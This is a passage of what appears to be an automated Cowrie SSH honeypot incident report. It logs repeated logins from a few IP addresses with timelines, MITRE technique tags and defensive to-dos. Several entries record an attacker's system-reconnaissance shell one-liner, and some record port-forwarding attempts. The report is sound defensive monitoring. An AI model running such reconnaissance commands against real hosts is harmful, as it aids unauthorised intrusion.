| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:55:11` | `cowrie.login.success` |
| `2026-07-19 04:55:16` | `cowrie.session.params` |
| `2026-07-19 04:55:16` | `cowrie.command.input` |
| `2026-07-19 04:55:18` | `cowrie.log.closed` |
| `2026-07-19 04:55:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3c7ba87d8c0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:55 |
| **Last Seen** | 2026-07-19 04:55 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:55:14` | `cowrie.session.connect` |
| `2026-07-19 04:55:16` | `cowrie.client.version` |
| `2026-07-19 04:55:16` | `cowrie.client.kex` |
| `2026-07-19 04:55:26` | `cowrie.login.success` |
| `2026-07-19 04:55:32` | `cowrie.session.params` |
| `2026-07-19 04:55:32` | `cowrie.command.input` |
| `2026-07-19 04:55:34` | `cowrie.log.closed` |
| `2026-07-19 04:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b041b9860391

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:55 |
| **Last Seen** | 2026-07-19 04:55 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:55:21` | `cowrie.session.connect` |
| `2026-07-19 04:55:25` | `cowrie.client.version` |
| `2026-07-19 04:55:25` | `cowrie.client.kex` |
| `2026-07-19 04:55:36` | `cowrie.login.success` |
| `2026-07-19 04:55:42` | `cowrie.session.params` |
| `2026-07-19 04:55:42` | `cowrie.command.input` |
| `2026-07-19 04:55:44` | `cowrie.log.closed` |
| `2026-07-19 04:55:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75d954d1553c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:55 |
| **Last Seen** | 2026-07-19 04:55 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:55:34` | `cowrie.session.connect` |
| `2026-07-19 04:55:37` | `cowrie.client.version` |
| `2026-07-19 04:55:37` | `cowrie.client.kex` |
| `2026-07-19 04:55:47` | `cowrie.login.success` |
| `2026-07-19 04:55:54` | `cowrie.session.params` |
| `2026-07-19 04:55:54` | `cowrie.command.input` |
| `2026-07-19 04:55:56` | `cowrie.log.closed` |
| `2026-07-19 04:55:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-368ee6103a5b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:55 |
| **Last Seen** | 2026-07-19 04:56 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:55:45` | `cowrie.session.connect` |
| `2026-07-19 04:55:51` | `cowrie.client.version` |
| `2026-07-19 04:55:51` | `cowrie.client.kex` |
| `2026-07-19 04:55:59` | `cowrie.login.success` |
| `2026-07-19 04:56:03` | `cowrie.session.params` |
| `2026-07-19 04:56:03` | `cowrie.command.input` |
| `2026-07-19 04:56:05` | `cowrie.log.closed` |
| `2026-07-19 04:56:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a222f8b1077

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:55 |
| **Last Seen** | 2026-07-19 04:56 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:55:59` | `cowrie.session.connect` |
| `2026-07-19 04:56:01` | `cowrie.client.version` |
| `2026-07-19 04:56:01` | `cowrie.client.kex` |
| `2026-07-19 04:56:08` | `cowrie.login.success` |
| `2026-07-19 04:56:10` | `cowrie.session.params` |
| `2026-07-19 04:56:10` | `cowrie.command.input` |
| `2026-07-19 04:56:11` | `cowrie.log.closed` |
| `2026-07-19 04:56:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7f4c1c8bc49

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:56 |
| **Last Seen** | 2026-07-19 04:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:56:14` | `cowrie.session.connect` |
| `2026-07-19 04:56:14` | `cowrie.client.version` |
| `2026-07-19 04:56:14` | `cowrie.client.kex` |
| `2026-07-19 04:56:18` | `cowrie.login.success` |
| `2026-07-19 04:56:21` | `cowrie.session.params` |
| `2026-07-19 04:56:21` | `cowrie.command.input` |
| `2026-07-19 04:56:23` | `cowrie.log.closed` |
| `2026-07-19 04:56:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c76662798bc8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 04:56 |
| **Last Seen** | 2026-07-19 04:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:56:15` | `cowrie.session.connect` |
| `2026-07-19 04:56:15` | `cowrie.client.version` |
| `2026-07-19 04:56:15` | `cowrie.client.kex` |
| `2026-07-19 04:56:17` | `cowrie.login.success` |
| `2026-07-19 04:56:18` | `cowrie.session.params` |
| `2026-07-19 04:56:18` | `cowrie.command.input` |
| `2026-07-19 04:56:18` | `cowrie.command.input` |
| `2026-07-19 04:56:18` | `cowrie.command.input` |
| `2026-07-19 04:56:18` | `cowrie.command.input` |
| `2026-07-19 04:56:18` | `cowrie.command.input` |
| `2026-07-19 04:56:18` | `cowrie.command.success` |
| `2026-07-19 04:56:18` | `cowrie.command.input` |
| `2026-07-19 04:56:18` | `cowrie.command.input` |
| `2026-07-19 04:56:18` | `cowrie.command.input` |
| `2026-07-19 04:56:18` | `cowrie.command.input` |
| `2026-07-19 04:56:19` | `cowrie.log.closed` |
| `2026-07-19 04:56:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-713cbfb851d8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:56 |
| **Last Seen** | 2026-07-19 04:56 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:56:22` | `cowrie.session.connect` |
| `2026-07-19 04:56:23` | `cowrie.client.version` |
| `2026-07-19 04:56:23` | `cowrie.client.kex` |
| `2026-07-19 04:56:33` | `cowrie.login.success` |
| `2026-07-19 04:56:37` | `cowrie.session.params` |
| `2026-07-19 04:56:37` | `cowrie.command.input` |
| `2026-07-19 04:56:39` | `cowrie.log.closed` |
| `2026-07-19 04:56:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-585fc0e6049a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:56 |
| **Last Seen** | 2026-07-19 04:56 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:56:34` | `cowrie.session.connect` |
| `2026-07-19 04:56:36` | `cowrie.client.version` |
| `2026-07-19 04:56:36` | `cowrie.client.kex` |
| `2026-07-19 04:56:45` | `cowrie.login.success` |
| `2026-07-19 04:56:49` | `cowrie.session.params` |
| `2026-07-19 04:56:49` | `cowrie.command.input` |
| `2026-07-19 04:56:51` | `cowrie.log.closed` |
| `2026-07-19 04:56:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-492283651645

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:56 |
| **Last Seen** | 2026-07-19 04:57 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:56:46` | `cowrie.session.connect` |
| `2026-07-19 04:56:48` | `cowrie.client.version` |
| `2026-07-19 04:56:48` | `cowrie.client.kex` |
| `2026-07-19 04:57:00` | `cowrie.login.success` |
| `2026-07-19 04:57:04` | `cowrie.session.params` |
| `2026-07-19 04:57:04` | `cowrie.command.input` |
| `2026-07-19 04:57:06` | `cowrie.log.closed` |
| `2026-07-19 04:57:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb0bcc43d9f0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:57 |
| **Last Seen** | 2026-07-19 04:57 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:57:00` | `cowrie.session.connect` |
| `2026-07-19 04:57:02` | `cowrie.client.version` |
| `2026-07-19 04:57:02` | `cowrie.client.kex` |
| `2026-07-19 04:57:08` | `cowrie.login.success` |
| `2026-07-19 04:57:13` | `cowrie.session.params` |
| `2026-07-19 04:57:13` | `cowrie.command.input` |
| `2026-07-19 04:57:15` | `cowrie.log.closed` |
| `2026-07-19 04:57:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15ca51404d21

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:57 |
| **Last Seen** | 2026-07-19 04:57 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:57:13` | `cowrie.session.connect` |
| `2026-07-19 04:57:15` | `cowrie.client.version` |
| `2026-07-19 04:57:15` | `cowrie.client.kex` |
| `2026-07-19 04:57:28` | `cowrie.login.success` |
| `2026-07-19 04:57:36` | `cowrie.session.params` |
| `2026-07-19 04:57:36` | `cowrie.command.input` |
| `2026-07-19 04:57:44` | `cowrie.log.closed` |
| `2026-07-19 04:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc6cbe42eabd

| Field | Detail |
|---|---|
| **Source IP** | `182.53.52[.]68` |
| **First Seen** | 2026-07-19 04:57 |
| **Last Seen** | 2026-07-19 04:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:57:19` | `cowrie.session.connect` |
| `2026-07-19 04:57:19` | `cowrie.client.version` |
| `2026-07-19 04:57:19` | `cowrie.client.kex` |
| `2026-07-19 04:57:21` | `cowrie.login.success` |
| `2026-07-19 04:57:22` | `cowrie.direct-tcpip.request` |
| `2026-07-19 04:57:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.53.52[.]68` to AbuseIPDB if not already reported
- [ ] Block `182.53.52[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82d4354c6c0b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:57 |
| **Last Seen** | 2026-07-19 04:57 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:57:20` | `cowrie.session.connect` |
| `2026-07-19 04:57:24` | `cowrie.client.version` |
| `2026-07-19 04:57:24` | `cowrie.client.kex` |
| `2026-07-19 04:57:43` | `cowrie.login.success` |
| `2026-07-19 04:57:53` | `cowrie.session.params` |
| `2026-07-19 04:57:53` | `cowrie.command.input` |
| `2026-07-19 04:57:57` | `cowrie.log.closed` |
| `2026-07-19 04:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03587966cd5e

| Field | Detail |
|---|---|
| **Source IP** | `179.185.18[.]67` |
| **First Seen** | 2026-07-19 04:57 |
| **Last Seen** | 2026-07-19 04:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:57:21` | `cowrie.session.connect` |
| `2026-07-19 04:57:21` | `cowrie.client.version` |
| `2026-07-19 04:57:21` | `cowrie.client.kex` |
| `2026-07-19 04:57:23` | `cowrie.login.success` |
| `2026-07-19 04:57:23` | `cowrie.direct-tcpip.request` |
| `2026-07-19 04:57:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.18[.]67` to AbuseIPDB if not already reported
- [ ] Block `179.185.18[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60eaef5f5d9a

| Field | Detail |
|---|---|
| **Source IP** | `179.185.18[.]67` |
| **First Seen** | 2026-07-19 04:57 |
| **Last Seen** | 2026-07-19 04:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:57:28` | `cowrie.session.connect` |
| `2026-07-19 04:57:29` | `cowrie.client.version` |
| `2026-07-19 04:57:29` | `cowrie.client.kex` |
| `2026-07-19 04:57:31` | `cowrie.login.success` |
| `2026-07-19 04:57:31` | `cowrie.direct-tcpip.request` |
| `2026-07-19 04:57:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.18[.]67` to AbuseIPDB if not already reported
- [ ] Block `179.185.18[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7a9f94d8afa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:57 |
| **Last Seen** | 2026-07-19 04:58 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:57:33` | `cowrie.session.connect` |
| `2026-07-19 04:57:39` | `cowrie.client.version` |
| `2026-07-19 04:57:39` | `cowrie.client.kex` |
| `2026-07-19 04:57:54` | `cowrie.login.success` |
| `2026-07-19 04:58:01` | `cowrie.session.params` |
| `2026-07-19 04:58:01` | `cowrie.command.input` |
| `2026-07-19 04:58:06` | `cowrie.log.closed` |
| `2026-07-19 04:58:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a6bfff10719

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:57 |
| **Last Seen** | 2026-07-19 04:58 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:57:54` | `cowrie.session.connect` |
| `2026-07-19 04:57:58` | `cowrie.client.version` |
| `2026-07-19 04:57:58` | `cowrie.client.kex` |
| `2026-07-19 04:58:15` | `cowrie.login.success` |
| `2026-07-19 04:58:22` | `cowrie.session.params` |
| `2026-07-19 04:58:22` | `cowrie.command.input` |
| `2026-07-19 04:58:24` | `cowrie.log.closed` |
| `2026-07-19 04:58:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-962c49d31c4b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 04:58 |
| **Last Seen** | 2026-07-19 04:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:58:07` | `cowrie.session.connect` |
| `2026-07-19 04:58:08` | `cowrie.client.version` |
| `2026-07-19 04:58:08` | `cowrie.client.kex` |
| `2026-07-19 04:58:09` | `cowrie.login.success` |
| `2026-07-19 04:58:10` | `cowrie.session.params` |
| `2026-07-19 04:58:10` | `cowrie.command.input` |
| `2026-07-19 04:58:10` | `cowrie.command.input` |
| `2026-07-19 04:58:10` | `cowrie.command.input` |
| `2026-07-19 04:58:10` | `cowrie.command.input` |
| `2026-07-19 04:58:10` | `cowrie.command.input` |
| `2026-07-19 04:58:10` | `cowrie.command.success` |
| `2026-07-19 04:58:10` | `cowrie.command.input` |
| `2026-07-19 04:58:10` | `cowrie.command.input` |
| `2026-07-19 04:58:10` | `cowrie.command.input` |
| `2026-07-19 04:58:10` | `cowrie.command.input` |
| `2026-07-19 04:58:11` | `cowrie.log.closed` |
| `2026-07-19 04:58:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83c45fbe1766

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:58 |
| **Last Seen** | 2026-07-19 04:58 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:58:09` | `cowrie.session.connect` |
| `2026-07-19 04:58:12` | `cowrie.client.version` |
| `2026-07-19 04:58:12` | `cowrie.client.kex` |
| `2026-07-19 04:58:23` | `cowrie.login.success` |
| `2026-07-19 04:58:27` | `cowrie.session.params` |
| `2026-07-19 04:58:27` | `cowrie.command.input` |
| `2026-07-19 04:58:28` | `cowrie.log.closed` |
| `2026-07-19 04:58:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec291f863733

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:58 |
| **Last Seen** | 2026-07-19 04:58 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:58:24` | `cowrie.session.connect` |
| `2026-07-19 04:58:25` | `cowrie.client.version` |
| `2026-07-19 04:58:25` | `cowrie.client.kex` |
| `2026-07-19 04:58:31` | `cowrie.login.success` |
| `2026-07-19 04:58:36` | `cowrie.session.params` |
| `2026-07-19 04:58:36` | `cowrie.command.input` |
| `2026-07-19 04:58:40` | `cowrie.log.closed` |
| `2026-07-19 04:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f9fa962f69b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:58 |
| **Last Seen** | 2026-07-19 04:59 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:58:34` | `cowrie.session.connect` |
| `2026-07-19 04:58:40` | `cowrie.client.version` |
| `2026-07-19 04:58:40` | `cowrie.client.kex` |
| `2026-07-19 04:58:58` | `cowrie.login.success` |
| `2026-07-19 04:59:04` | `cowrie.session.params` |
| `2026-07-19 04:59:04` | `cowrie.command.input` |
| `2026-07-19 04:59:07` | `cowrie.log.closed` |
| `2026-07-19 04:59:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6171d1cadc7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:58 |
| **Last Seen** | 2026-07-19 04:59 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:58:41` | `cowrie.session.connect` |
| `2026-07-19 04:58:47` | `cowrie.client.version` |
| `2026-07-19 04:58:47` | `cowrie.client.kex` |
| `2026-07-19 04:59:01` | `cowrie.login.success` |
| `2026-07-19 04:59:08` | `cowrie.session.params` |
| `2026-07-19 04:59:08` | `cowrie.command.input` |
| `2026-07-19 04:59:11` | `cowrie.log.closed` |
| `2026-07-19 04:59:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
